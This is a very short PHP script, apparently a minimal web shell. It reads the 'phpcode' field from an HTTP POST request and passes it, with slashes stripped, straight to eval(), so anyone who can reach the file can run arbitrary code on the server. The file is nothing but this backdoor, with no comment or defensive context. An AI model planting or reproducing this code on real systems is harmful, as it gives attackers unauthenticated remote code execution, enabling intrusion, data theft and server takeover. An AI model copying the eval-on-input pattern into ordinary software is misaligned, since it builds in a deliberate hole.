<?php
$phpcode = $_POST['phpcode'];
	
echo "<br><br>";
eval(stripslashes($phpcode));
?>
